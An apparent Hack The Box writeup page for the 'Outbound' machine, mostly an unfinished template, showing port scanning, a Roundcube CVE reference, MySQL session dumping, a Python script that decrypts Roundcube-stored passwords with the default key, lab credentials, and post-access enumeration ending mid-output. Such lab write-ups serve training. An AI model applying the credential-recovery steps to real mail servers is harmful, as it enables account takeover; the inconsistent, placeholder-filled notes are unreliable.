@@ -1,0 +1,364 @@
+<!DOCTYPE html><html lang="es"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Outbound Hack The Box - Writeup</title><link rel="stylesheet" href="/_astro/articles.CNCOhu5i.css"></head> <body class="bg-bg1 text-white"> <div class="min-h-screen flex flex-col"> <header class="w-full py-4"> <div class="container mx-auto flex items-center justify-between"> <a href="/" class="flex items-center gap-3"> <div class="w-10 h-10 rounded-lg main-card flex items-center justify-center font-mono">AC</div> <div> <div class="text-lg font-semibold">Angel Corral</div> <div class="text-xs text-slate-400">Ciberseguridad · Hacking Ético</div> </div> </a> <nav class="flex items-center gap-6 text-sm"> <a href="/writeups">Writeups</a> <a href="/articles">Artículos</a> <a href="/projects">Proyectos</a> <a href="/services">Servicios</a> <a href="/contact" class="px-3 py-1 rounded-md border">Contacto</a> </nav> </div> </header> <main class="container mx-auto px-6 py-10 flex-1">   <article class="max-w-3xl mx-auto px-6"> <!-- Header del artículo --> <div class="mb-12"> <div class="flex flex-wrap gap-4 items-center mb-6"> <a href="/writeups" class="text-sm text-slate-400 hover:text-accentBlue transition-colors">
+← Volver a Writeups
+</a> <div class="text-sm text-slate-400"> 10 de septiembre de 2025 </div> </div> <h1 class="text-4xl font-bold bg-gradient-to-r from-accentBlue to-accentGreen text-transparent bg-clip-text mb-4"> Outbound Hack The Box </h1> <p class="text-lg text-slate-300 mb-6">Debe tener Descripccion</p> <div class="flex flex-wrap gap-3"> <span class="px-3 py-1 rounded-full bg-accentBlue/10 text-accentBlue border border-accentBlue/20 text-sm"> Easy </span> <span class="px-3 py-1 rounded-full bg-slate-800/50 text-slate-300 text-sm"> nmap </span><span class="px-3 py-1 rounded-full bg-slate-800/50 text-slate-300 text-sm"> gobuster </span><span class="px-3 py-1 rounded-full bg-slate-800/50 text-slate-300 text-sm"> ssh </span><span class="px-3 py-1 rounded-full bg-slate-800/50 text-slate-300 text-sm"> sudo -l </span> </div> </div> <!-- Contenido del artículo --> <div class="prose prose-invert prose-xl max-w-none
+        prose-h2:mt-12 prose-h2:mb-6 prose-h2:text-2xl prose-h2:font-semibold prose-h2:text-slate-100
+        prose-h3:mt-8 prose-h3:mb-4 prose-h3:text-xl prose-h3:font-medium prose-h3:text-slate-200
+        prose-p:mb-4 prose-p:text-slate-300 prose-p:leading-relaxed
+        prose-a:text-accentBlue prose-a:no-underline hover:prose-a:underline
+        prose-strong:text-slate-200
+        prose-code:text-slate-300 prose-code:bg-slate-800/50 prose-code:rounded prose-code:px-1.5 prose-code:py-0.5 prose-code:border prose-code:border-slate-700/30
+        prose-pre:my-8 prose-pre:rounded-lg prose-pre:p-6 prose-pre:bg-slate-900/80 prose-pre:border prose-pre:border-slate-700/40 prose-pre:overflow-x-auto
+        prose-table:my-8 prose-table:bg-slate-800/30 prose-table:border prose-table:border-slate-700/30 prose-table:rounded-lg prose-table:overflow-hidden
+        prose-th:bg-slate-800 prose-th:text-slate-200 prose-th:p-3 prose-th:border prose-th:border-slate-700/30
+        prose-td:p-3 prose-td:border prose-td:border-slate-700/30
+        prose-ul:my-6 prose-li:mb-3 prose-li:text-slate-300
+        prose-hr:border-slate-800 prose-hr:my-8
+        prose-blockquote:border-l-accentBlue/30 prose-blockquote:bg-slate-800/20 prose-blockquote:rounded-r prose-blockquote:px-6 prose-blockquote:py-4 prose-blockquote:not-italic prose-blockquote:my-8
+        prose-img:mb-8 prose-img:mx-auto prose-img:rounded-lg prose-img:shadow-lg
+      "> <h1 id="outbound-htb">Outbound HTB</h1>
+<h2 id=""><img src="/img/Outbound.png" alt="Banner SoulMate"></h2>
+<ul>
+<li>Credenciales Para El Desafio:</li>
+</ul>
+<hr>
+<h2 id="-escaneo-y-enumeración">🔎 Escaneo y Enumeración</h2>
+<hr>
+<h3 id="-escaneos">📌 Escaneos</h3>
+<ul>
+<li>Escanear y Exportar resultados:</li>
+</ul>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">nmap</span><span style="color:#79B8FF"> -sSCV</span><span style="color:#79B8FF"> -p-</span><span style="color:#79B8FF"> --open</span><span style="color:#79B8FF"> -T4</span><span style="color:#79B8FF"> -Pn</span><span style="color:#79B8FF"> -n</span><span style="color:#79B8FF"> -vvv</span><span style="color:#79B8FF"> -oN</span><span style="color:#9ECBFF"> escaneo_nmap.txt</span><span style="color:#79B8FF"> -oX</span><span style="color:#9ECBFF"> escaneo_nmap.xml</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">I</span><span style="color:#E1E4E8">P</span><span style="color:#F97583">></span></span></code></pre>
+<h3 id="-puertos-y-servicios-descubiertos">📦 Puertos y Servicios Descubiertos</h3>
+<ul>
+<li>
+<p>WhatWeb: <a href="http://outbound.htb">http://outbound.htb</a> [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.10.11.77], RedirectLocation[<a href="http://mail.outbound.htb/">http://mail.outbound.htb/</a>], Title[302 Found], nginx[1.24.0]</p>
+</li>
+<li>
+<p>Captura:</p>
+</li>
+</ul>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
+<span class="line"><span style="color:#B392F0"> PORT</span><span style="color:#9ECBFF">   STATE</span><span style="color:#9ECBFF"> SERVICE</span><span style="color:#9ECBFF"> REASON</span><span style="color:#9ECBFF">         VERSION</span></span>
+<span class="line"><span style="color:#E1E4E8"> </span></span>
+<span class="line"><span style="color:#B392F0">  22/tcp</span><span style="color:#9ECBFF"> open</span><span style="color:#9ECBFF">  ssh</span><span style="color:#9ECBFF">     syn-ack</span><span style="color:#9ECBFF"> ttl</span><span style="color:#79B8FF"> 63</span><span style="color:#9ECBFF"> OpenSSH</span><span style="color:#9ECBFF"> 9.6p1</span><span style="color:#9ECBFF"> Ubuntu</span><span style="color:#9ECBFF"> 3ubuntu13.12</span><span style="color:#E1E4E8"> (Ubuntu </span><span style="color:#9ECBFF">Linux</span><span style="color:#E1E4E8">; </span><span style="color:#B392F0">protocol</span><span style="color:#79B8FF"> 2.0</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8"> </span></span>
+<span class="line"><span style="color:#B392F0">  80/tcp</span><span style="color:#9ECBFF"> open</span><span style="color:#9ECBFF">  http</span><span style="color:#9ECBFF">    syn-ack</span><span style="color:#9ECBFF"> ttl</span><span style="color:#79B8FF"> 63</span><span style="color:#9ECBFF"> nginx</span><span style="color:#79B8FF"> 1.24.0</span><span style="color:#E1E4E8"> (Ubuntu)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">  http-title:</span><span style="color:#9ECBFF"> Did</span><span style="color:#9ECBFF"> not</span><span style="color:#9ECBFF"> follow</span><span style="color:#9ECBFF"> redirect</span><span style="color:#9ECBFF"> to</span><span style="color:#9ECBFF"> http://mail.outbound.htb/</span></span>
+<span class="line"><span style="color:#B392F0">  Service</span><span style="color:#9ECBFF"> Info:</span><span style="color:#9ECBFF"> OS:</span><span style="color:#9ECBFF"> Linux</span><span style="color:#E1E4E8">; </span><span style="color:#B392F0">CPE:</span><span style="color:#9ECBFF"> cpe:/o:linux:linux_kernel</span></span>
+<span class="line"></span></code></pre>
+<h3 id="-enumeración-web">🌐 Enumeración Web</h3>
+<ul>
+<li>Comandos Utilisados:</li>
+</ul>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">gobuster</span><span style="color:#9ECBFF"> dir</span><span style="color:#79B8FF"> -u</span><span style="color:#9ECBFF"> http://</span><span style="color:#F97583">&#x3C;</span><span style="color:#9ECBFF">I</span><span style="color:#E1E4E8">P</span><span style="color:#F97583">></span><span style="color:#79B8FF"> -w</span><span style="color:#9ECBFF"> /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt</span><span style="color:#79B8FF"> -t</span><span style="color:#79B8FF"> 50</span><span style="color:#79B8FF"> -b</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">NO-STATU</span><span style="color:#E1E4E8">S</span><span style="color:#F97583">></span></span></code></pre>
+<h3 id="-hallazgos">📂 Hallazgos</h3>
+<ul>
+<li>Capturas:</li>
+</ul>
+<p><img src="/img/placeholder-hero.svg" alt="Pasted image 20251004205139.png"></p>
+<p><img src="/img/placeholder-hero.svg" alt="Pasted image 20251004205621.png"></p>
+<ul>
+<li>
+<p>Tecnologías: “</p>
+</li>
+<li>
+<p>Recurso accesibles descargables: “</p>
+</li>
+<li>
+<p>Contenido Archivos: “</p>
+</li>
+</ul>
+<h3 id="-vulnerabilidades">🔍 Vulnerabilidades</h3>
+<ul>
+<li>
+<p>CVE: <code>CVE-2025-49113</code></p>
+</li>
+<li>
+<p>Nivel: <code>___</code></p>
+</li>
+<li>
+<p>Versiones Encontradas: <code>Roundcube 1.6.10</code></p>
+</li>
+</ul>
+<h3 id="-credenciales">🔗 Credenciales</h3>
+<ul>
+<li>
+<p>Usuario: <code>___</code></p>
+</li>
+<li>
+<p>Contraseña: <code>___</code></p>
+</li>
+<li>
+<p>Origen (FTP/SSH/Web): <code>___</code></p>
+</li>
+</ul>
+<hr>
+<h1 id="-explotación">💥 Explotación</h1>
+<p><img src="/img/placeholder-hero.svg" alt="Pasted image 20251005195225.png"></p>
+<p><img src="/img/placeholder-hero.svg" alt="Pasted image 20251005200343.png"></p>
+<p>Comandos:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">mysql</span><span style="color:#79B8FF"> -u</span><span style="color:#9ECBFF"> roundcube</span><span style="color:#79B8FF"> -pRCDBPass2025</span><span style="color:#79B8FF"> -D</span><span style="color:#9ECBFF"> roundcube</span></span>
+<span class="line"></span></code></pre>
+<p>Resultado:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
+<span class="line"><span style="color:#6A737D"># SELECT * FROM users;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">user_id</span><span style="color:#9ECBFF"> username</span><span style="color:#9ECBFF">         mail_host</span><span style="color:#E1E4E8">  </span></span>
+<span class="line"><span style="color:#E1E4E8">                 </span></span>
+<span class="line"><span style="color:#B392F0">3</span><span style="color:#9ECBFF">       tyler</span><span style="color:#9ECBFF">     localhost</span><span style="color:#9ECBFF">       {s:11:"client_hash"</span><span style="color:#E1E4E8">;</span><span style="color:#B392F0">s:16:</span><span style="color:#B392F0">"2aezFDLvMZhM0VRa"</span><span style="color:#E1E4E8">;</span><span style="color:#B392F0">i:0</span><span style="color:#E1E4E8">;</span><span style="color:#B392F0">b:0</span><span style="color:#E1E4E8">;}</span></span>
+<span class="line"><span style="color:#B392F0">1</span><span style="color:#9ECBFF">       jacob</span><span style="color:#9ECBFF">     localhost</span><span style="color:#9ECBFF">       {s:11:"client_hash"</span><span style="color:#E1E4E8">;</span><span style="color:#B392F0">s:16:</span><span style="color:#B392F0">"hpLLqLwmqbyihpi7"</span><span style="color:#E1E4E8">;}</span></span>
+<span class="line"><span style="color:#B392F0">2</span><span style="color:#9ECBFF">       mel</span><span style="color:#9ECBFF">       localhost</span><span style="color:#9ECBFF">       {s:11:"client_hash"</span><span style="color:#E1E4E8">;</span><span style="color:#B392F0">s:16:</span><span style="color:#B392F0">"GCrPGMkZvbsnc3xv"</span><span style="color:#E1E4E8">;}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># SHOW TABLES;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">cache</span></span>
+<span class="line"><span style="color:#B392F0">cache_index</span></span>
+<span class="line"><span style="color:#B392F0">cache_messages</span></span>
+<span class="line"><span style="color:#B392F0">cache_shared</span></span>
+<span class="line"><span style="color:#B392F0">cache_thread</span></span>
+<span class="line"><span style="color:#B392F0">collected_addresses</span></span>
+<span class="line"><span style="color:#B392F0">contactgroupmembers</span></span>
+<span class="line"><span style="color:#B392F0">contactgroups</span></span>
+<span class="line"><span style="color:#B392F0">contacts</span></span>
+<span class="line"><span style="color:#B392F0">dictionary</span></span>
+<span class="line"><span style="color:#B392F0">filestore</span></span>
+<span class="line"><span style="color:#B392F0">identities</span></span>
+<span class="line"><span style="color:#B392F0">responses</span></span>
+<span class="line"><span style="color:#B392F0">searches</span></span>
+<span class="line"><span style="color:#B392F0">session</span></span>
+<span class="line"><span style="color:#B392F0">system</span></span>
+<span class="line"><span style="color:#B392F0">users</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># SELECT * FROM session;</span></span>
+<span class="line"></span>
+<span class="line"></span></code></pre>
+<p>Decodificador:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
+<span class="line"><span style="color:#B392F0">import</span><span style="color:#9ECBFF"> base64</span></span>
+<span class="line"><span style="color:#B392F0">from</span><span style="color:#9ECBFF"> Crypto.Cipher</span><span style="color:#9ECBFF"> import</span><span style="color:#9ECBFF"> DES3</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">key</span><span style="color:#9ECBFF"> =</span><span style="color:#9ECBFF"> b'rcmail-!24ByteDESkey*Str'</span></span>
+<span class="line"><span style="color:#B392F0">def</span><span style="color:#9ECBFF"> rcube_decrypt</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">cipher_b64,</span><span style="color:#9ECBFF"> key</span><span style="color:#E1E4E8">)</span><span style="color:#9ECBFF">:</span></span>
+<span class="line"><span style="color:#B392F0">    cipher_raw</span><span style="color:#9ECBFF"> =</span><span style="color:#9ECBFF"> base64.b64decode</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">cipher_b64</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#B392F0">    iv</span><span style="color:#9ECBFF"> =</span><span style="color:#9ECBFF"> cipher_raw[:8]</span></span>
+<span class="line"><span style="color:#B392F0">    ciphertext</span><span style="color:#9ECBFF"> =</span><span style="color:#9ECBFF"> cipher_raw[8:]</span></span>
+<span class="line"><span style="color:#B392F0">    cipher</span><span style="color:#9ECBFF"> =</span><span style="color:#9ECBFF"> DES3.new</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">key,</span><span style="color:#9ECBFF"> DES3.MODE_CBC,</span><span style="color:#9ECBFF"> iv</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#B392F0">    plaintext</span><span style="color:#9ECBFF"> =</span><span style="color:#9ECBFF"> cipher.decrypt</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">ciphertext</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#B392F0">    pad_len</span><span style="color:#9ECBFF"> =</span><span style="color:#9ECBFF"> plaintext[-1]</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#9ECBFF"> plaintext[:-pad_len].decode</span><span style="color:#E1E4E8">(errors</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">"ignore"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">cipher_b64</span><span style="color:#9ECBFF"> =</span><span style="color:#9ECBFF"> "bL9uVf9w35H/YQC75uyDjo1d/RR/zsUU"</span></span>
+<span class="line"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">rcube_decrypt</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">cipher_b64,</span><span style="color:#9ECBFF"> key</span><span style="color:#E1E4E8">))</span></span></code></pre>
+<hr>
+<h3 id="-resumen">📂 Resumen</h3>
+<ul>
+<li>
+<p>Servicio: “</p>
+</li>
+<li>
+<p>Método: “</p>
+</li>
+<li>
+<p>Exploit: “</p>
+</li>
+<li>
+<p>Resultado (shell/flag): “</p>
+</li>
+</ul>
+<h3 id="-explicación">📝 Explicación</h3>
+<h3 id="-vulnerabilidades-1">🔍 Vulnerabilidades</h3>
+<ul>
+<li>
+<p>CVE: <code>___</code></p>
+</li>
+<li>
+<p>Nivel: <code>___</code></p>
+</li>
+</ul>
+<h3 id="-credenciales-1">🔗 Credenciales</h3>
+<ul>
+<li>
+<p>Usuario: <code>jacob</code></p>
+</li>
+<li>
+<p>Contraseña: <code>595mO8DmwGeD</code></p>
+</li>
+</ul>
+<p><img src="/img/placeholder-hero.svg" alt="Pasted image 20251007190525.png"></p>
+<p><img src="/img/placeholder-hero.svg" alt="Pasted image 20251007190702.png"></p>
+<p><img src="/img/placeholder-hero.svg" alt="Pasted image 20251007191335.png"></p>
+<p><img src="/img/placeholder-hero.svg" alt="Pasted image 20251007210947.png"></p>
+<ul>
+<li>Origen (FTP/SSH/Web): <code>MAIL PORTAL</code></li>
+</ul>
+<p>POC: <a href="https://github.com/BridgerAlderson/CVE-2025-27591-PoC/blob/main/exploit.py">https://github.com/BridgerAlderson/CVE-2025-27591-PoC/blob/main/exploit.py</a></p>
+<hr>
+<h1 id="️-escalada">🛡️ Escalada</h1>
+<hr>
+<h3 id="-resumen-1">📂 Resumen</h3>
+<ul>
+<li>
+<p>Impacto real: “</p>
+</li>
+<li>
+<p>Rutas clave: <code>___</code></p>
+</li>
+<li>
+<p>Método: <code>Pivoting, Reastic abuse privilege</code></p>
+</li>
+<li>
+<p>Nivel de Acceso: <code>root</code></p>
+</li>
+<li>
+<p>PoC: <code>___</code></p>
+</li>
+</ul>
+<h3 id="-explicación-1">📝 Explicación</h3>
+<h3 id="-vulnerabilidades-2">🔍 Vulnerabilidades</h3>
+<ul>
+<li>
+<p>CVE: <code>___</code></p>
+</li>
+<li>
+<p>Nivel: <code>___</code></p>
+</li>
+</ul>
+<h3 id="-credenciales-2">🔗 Credenciales</h3>
+<ul>
+<li>
+<p>Usuario: <code>___</code></p>
+</li>
+<li>
+<p>Contraseña: <code>___</code></p>
+</li>
+<li>
+<p>Origen (FTP/SSH/Web): <code>___</code></p>
+</li>
+</ul>
+<hr>
+<h1 id="-reporte-final">📌 Reporte Final</h1>
+<hr>
+<ul>
+<li>
+<p>Descripción General: <code>Linux · Easy</code></p>
+</li>
+<li>
+<p>Recomendaciones: <code>___</code></p>
+</li>
+<li>
+<p>Puertos abiertos: <code>___</code></p>
+</li>
+<li>
+<p>Usuarios válidos: <code>___</code></p>
+</li>
+<li>
+<p>Credenciales útiles: <code>___</code></p>
+</li>
+<li>
+<p>Posibles escaladas: <code>___</code></p>
+</li>
+<li>
+<p>PoC: <code>___</code></p>
+</li>
+<li>
+<p>Impacto: <code>___</code></p>
+</li>
+<li>
+<p>Nivel de acceso logrado: <code>___</code></p>
+</li>
+</ul>
+<hr>
+<h1 id="️-notas-y-herramientas">🛠️ Notas y Herramientas:</h1>
+<p>0.10.11.77</p>
+<p>10.10.16.89</p>
+<p>10.158.245.23</p>
+<p>PORT:
+22
+80</p>
+<p>CREDENTIALS:
+tyler = LhKL1o9Nm3X2
+jacob = gY4Wr3a1evp4</p>
+<p>SUBDOMINIOS:
+mail.outbound.htb
+outbound.htb</p>
+<p>name=“_token” value=“U26BEkCTg2Nj1V8WN1tDW9ciR7KBPsSF”
+TECNOLOGY:</p>
+<p>Roundcube 1.6.10.</p>
+<p>USERS:</p>
+<p>tyler
+jacob
+mel
+mail
+root</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
+<span class="line"><span style="color:#B392F0">jacob@outbound:~$</span><span style="color:#9ECBFF"> id</span></span>
+<span class="line"><span style="color:#E1E4E8">uid</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">1002</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">jacob</span><span style="color:#E1E4E8">) gid</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">1002</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">jacob</span><span style="color:#E1E4E8">) groups</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">1002</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">jacob</span><span style="color:#E1E4E8">)</span><span style="color:#9ECBFF">,100</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">users</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#B392F0">jacob@outbound:~$</span><span style="color:#9ECBFF"> whoami</span></span>
+<span class="line"><span style="color:#B392F0">jacob</span></span>
+<span class="line"><span style="color:#B392F0">jacob@outbound:~$</span><span style="color:#9ECBFF"> uname</span><span style="color:#79B8FF"> -a</span></span>
+<span class="line"><span style="color:#B392F0">Linux</span><span style="color:#9ECBFF"> outbound</span><span style="color:#9ECBFF"> 6.8.0-63-generic</span><span style="color:#6A737D"> #66-Ubuntu SMP PREEMPT_DYNAMIC Fri Jun 13 20:25:30 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux</span></span>
+<span class="line"><span style="color:#B392F0">jacob@outbound:~$</span><span style="color:#9ECBFF"> cat</span><span style="color:#9ECBFF"> /etc/os-release</span></span>
+<span class="line"><span style="color:#E1E4E8">PRETTY_NAME</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">"Ubuntu 24.04.2 LTS"</span></span>
+<span class="line"><span style="color:#E1E4E8">NAME</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">"Ubuntu"</span></span>
+<span class="line"><span style="color:#E1E4E8">VERSION_ID</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">"24.04"</span></span>
+<span class="line"><span style="color:#E1E4E8">VERSION</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">"24.04.2 LTS (Noble Numbat)"</span></span>
+<span class="line"><span style="color:#E1E4E8">VERSION_CODENAME</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">noble</span></span>
+<span class="line"><span style="color:#E1E4E8">ID</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">ubuntu</span></span>
+<span class="line"><span style="color:#E1E4E8">ID_LIKE</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">debian</span></span>
+<span class="line"><span style="color:#E1E4E8">HOME_URL</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">"https://www.ubuntu.com/"</span></span>
+<span class="line"><span style="color:#E1E4E8">SUPPORT_URL</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">"https://help.ubuntu.com/"</span></span>
+<span class="line"><span style="color:#E1E4E8">BUG_REPORT_URL</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">"https://bugs.launchpad.net/ubuntu/"</span></span>
+<span class="line"><span style="color:#E1E4E8">PRIVACY_POLICY_URL</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"</span></span>
+<span class="line"><span style="color:#E1E4E8">UBUNTU_CODENAME</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">noble</span></span>
+<span class="line"><span style="color:#E1E4E8">LOGO</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">ubuntu-logo</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">acob@outbound:~$</span><span style="color:#9ECBFF"> ss</span><span style="color:#79B8FF"> -tulpn</span></span>
+<span class="line"><span style="color:#B392F0">Netid</span><span style="color:#9ECBFF">         State</span><span style="color:#9ECBFF">          Recv-Q</span><span style="color:#9ECBFF">         Send-Q</span><span style="color:#9ECBFF">                 Local</span><span style="color:#9ECBFF"> Address:Port</span><span style="color:#9ECBFF">                 Peer</span><span style="color:#9ECBFF"> Address:Port</span><span style="color:#9ECBFF">        Process</span><span style="color:#E1E4E8">         </span></span>
+<span class="line"><span style="color:#B392F0">udp</span><span style="color:#9ECBFF">           UNCONN</span><span style="color:#79B8FF">         0</span><span style="color:#79B8FF">              0</span><span style="color:#9ECBFF">                         127.0.0.54:53</span><span style="color:#9ECBFF">                        0.0.0.0:</span><span style="color:#79B8FF">*</span><span style="color:#E1E4E8">                           </span></span>
+<span class="line"><span style="color:#B392F0">udp</span><span style="color:#9ECBFF">           UNCONN</span><span style="color:#79B8FF">         0</span><span style="color:#79B8FF">              0</span><span style="color:#9ECBFF">                      127.0.0.53%lo:53</span><span style="color:#9ECBFF">                        0.0.0.0:</span><span style="color:#79B8FF">*</span><span style="color:#E1E4E8">                           </span></span>
+<span class="line"><span style="color:#B392F0">tcp</span><span style="color:#9ECBFF">           LISTEN</span><span style="color:#79B8FF">         0</span><span style="color:#79B8FF">              4096</span><span style="color:#9ECBFF">                      127.0.0.54:53</span><span style="color:#9ECBFF">                        0.0.0.0:</span><span style="color:#79B8FF">*</span><span style="color:#E1E4E8">                           </span></span>
+<span class="line"><span style="color:#B392F0">tcp</span><span style="color:#9ECBFF">           LISTEN</span><span style="color:#79B8FF">         0</span><span style="color:#79B8FF">              511</span><span style="color:#9ECBFF">                          0.0.0.0:80</span><span style="color:#9ECBFF">                        0.0.0.0:</span><span style="color:#79B8FF">*</span><span style="color:#E1E4E8">                           </span></span>
+<span class="line"><span style="color:#B392F0">tcp</span><span style="color:#9ECBFF">           LISTEN</span><span style="color:#79B8FF">         0</span><span style="color:#79B8FF">              4096</span><span style="color:#9ECBFF">                   127.0.0.53%lo:53</span><span style="color:#9ECBFF">                        0.0.0.0:</span><span style="color:#79B8FF">*</span><span style="color:#E1E4E8">                           </span></span>
+<span class="line"><span style="color:#B392F0">tcp</span><span style="color:#9ECBFF">           LISTEN</span><span style="color:#79B8FF">         0</span><span style="color:#79B8FF">              4096</span><span style="color:#9ECBFF">                       127.0.0.1:5000</span><span style="color:#9ECBFF">                      0.0.0.0:</span><span style="color:#79B8FF">*</span><span style="color:#E1E4E8">                           </span></span>
+<span class="line"><span style="color:#B392F0">tcp</span><span style="color:#9ECBFF">           LISTEN</span><span style="color:#79B8FF">         0</span><span style="color:#79B8FF">              511</span><span style="color:#E1E4E8">                             [::]:80                           [::]:</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">                           </span></span>
+<span class="line"><span style="color:#B392F0">tcp</span><span style="color:#9ECBFF">           LISTEN</span><span style="color:#79B8FF">         0</span><span style="color:#79B8FF">              4096</span><span style="color:#79B8FF">                               *</span><span style="color:#9ECBFF">:22</span><span style="color:#79B8FF">                              *</span><span style="color:#9ECBFF">:</span><span style="color:#79B8FF">*</span><span style="color:#E1E4E8">     </span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">jacob@outbound:~$</span><span style="color:#9ECBFF"> ps</span><span style="color:#9ECBFF"> aux</span></span>
+<span class="line"><span style="color:#B392F0">USER</span><span style="color:#9ECBFF">         PID</span><span style="color:#9ECBFF"> %CPU</span><span style="color:#9ECBFF"> %MEM</span><span style="color:#9ECBFF">    VSZ</span><span style="color:#9ECBFF">   RSS</span><span style="color:#9ECBFF"> TTY</span><span style="color:#9ECBFF">      STAT</span><span style="color:#9ECBFF"> START</span><span style="color:#9ECBFF">   TIME</span><span style="color:#9ECBFF"> COMMAND</span></span>
+<span class="line"><span style="color:#B392F0">jacob</span><span style="color:#79B8FF">      92270</span><span style="color:#79B8FF">  0.0</span><span style="color:#79B8FF">  0.1</span><span style="color:#79B8FF">   8648</span><span style="color:#79B8FF">  5376</span><span style="color:#9ECBFF"> pts/0</span><span style="color:#9ECBFF">    Ss+</span><span style="color:#9ECBFF">  22:03</span><span style="color:#9ECBFF">   0:00</span><span style="color:#79B8FF"> -bash</span></span>
+<span class="line"><span style="color:#B392F0">jacob</span><span style="color:#79B8FF">      95229</span><span style="color:#79B8FF">  0.0</span><span style="color:#79B8FF">  0.1</span><span style="color:#79B8FF">   8648</span><span style="color:#79B8FF">  5376</span><span style="color:#9ECBFF"> pts/1</span><span style="color:#9ECBFF">    Ss</span><span style="color:#9ECBFF">   22:12</span><span style="color:#9ECBFF">   0:00</span><span style="color:#79B8FF"> -bash</span></span>
+<span class="line"><span style="color:#B392F0">jacob</span><span style="color:#79B8FF">      96192</span><span style="color:#79B8FF">  0.0</span><span style="color:#79B8FF">  0.1</span><span style="color:#79B8FF">  10884</span><span style="color:#79B8FF">  4352</span><span style="color:#9ECBFF"> pts/1</span><span style="color:#9ECBFF">    R+</span><span style="color:#9ECBFF">   22:16</span><span style="color:#9ECBFF">   0:00</span><span style="color:#9ECBFF"> ps</span><span style="color:#9ECBFF"> aux</span></span>
+<span class="line"><span style="color:#B392F0">jacob@outbound:~$</span><span style="color:#9ECBFF"> crontab</span><span style="color:#79B8FF"> -l</span></span>
+<span class="line"><span style="color:#B392F0">no</span><span style="color:#9ECBFF"> crontab</span><span style="color:#9ECBFF"> for</span><span style="color:#9ECBFF"> jacob</span></span>
+<span class="line"><span style="color:#B392F0">jacob@outbound:~$</span><span style="color:#9ECBFF"> sudo</span><span style="color:#79B8FF"> -l</span></span>
+<span class="line"><span style="color:#B392F0">Matching</span><span style="color:#9ECBFF"> Defaults</span><span style="color:#9ECBFF"> entries</span><span style="color:#9ECBFF"> for</span><span style="color:#9ECBFF"> jacob</span><span style="color:#9ECBFF"> on</span><span style="color:#9ECBFF"> outbound:</span></span>
